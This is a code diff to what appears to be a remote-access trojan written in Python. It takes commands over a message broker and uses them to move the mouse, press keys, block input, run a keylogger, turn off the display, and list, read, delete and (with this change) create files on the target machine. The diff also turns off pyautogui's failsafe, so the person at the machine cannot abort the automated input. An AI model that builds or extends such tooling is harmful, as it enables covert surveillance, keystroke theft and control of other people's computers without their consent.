@@ -20,9 +20,10 @@ import blockInput
 from notepadType import notepad_write,draw_heart,start_random_move,stop_random_move
 from prompt import alertPrompt, inputPrompt
 from klogging import start_logging,stop_logging
-from filecontrol import list_folder,read_file,delete_file
+from filecontrol import list_folder,read_file,delete_file,create_file
 from systemcontrol import display_off,display_on
 
+pg.FAILSAFE = False
 # Startup setup
 FLAG_FILE = Path(os.getenv('APPDATA')) / "firstrun.flag"
 
@@ -106,9 +107,9 @@ def handle_msg(msg):
             safe_thread(pg.press, "backspace")
         elif msg == "drawheart":
             draw_heart()
-        elif msg == "rightclick":
+        elif msg == "mouseright":
             pg.rightClick()  
-        elif msg == "leftclick":
+        elif msg == "mouseleft":
             pg.leftClick()    
         elif msg == "click":
             pg.click()   
@@ -226,7 +227,14 @@ def handle_msg(msg):
                 def delete():
                     dataread=delete_file(parts[0],parts[1])
                     client.publish(ACK_TOPIC,f"File Delete :---> {dataread}")
-                safe_thread(delete)         
+                safe_thread(delete)
+        elif msg.startswith("createfile"):
+            parts = msg[len("createfile "):].split()
+            if len(parts) == 3:
+                def create():
+                    dataread=create_file(parts[0],parts[1],parts[2])
+                    client.publish(ACK_TOPIC,f"File Create :---> {dataread}")
+                safe_thread(create)                 
         elif msg.startswith("moveto"):
             parts = msg[len("moveto "):].split()
             if len(parts) == 2:
